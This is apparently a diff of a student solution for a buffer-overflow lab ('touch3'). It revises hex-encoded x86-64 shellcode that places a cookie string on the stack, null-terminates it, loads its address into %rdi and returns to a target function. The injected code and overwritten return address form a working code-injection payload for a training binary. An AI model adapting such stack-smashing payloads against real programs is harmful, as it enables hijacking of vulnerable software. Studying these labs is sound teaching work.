@@ -5,11 +5,11 @@
 
 a8 dc 61 55 00 00 00 00 /* stack */
 
-68 fa 18 40 00       	/* push   $0x4018fa    touch3 address        */
 48 83 ec 0e          	/* sub    $0xe,%rsp                  */ 
-48 b8 35 39 62 39 39 	/* movabs $0x6166373939623935,%rax */
+48 b8 35 39 62 39 39 	/* movabs $0x6166373939623935,%rax  from test-string.s */
 37 66 61                
 48 89 04 24       	    /* mov    %rax,(%rsp)             */
+66 c7 44 24 08 00 00    /* movw   $0x0,0x8(%rsp) set \0 to the end of the string */
 48 89 e7                /* mov    %rsp,%rdi */
-48 83 c4 0e             /* add    $0xe,%rsp */
+68 fa 18 40 00       	/* push   $0x4018fa    touch3 address        */
 c3                   	/* ret    */
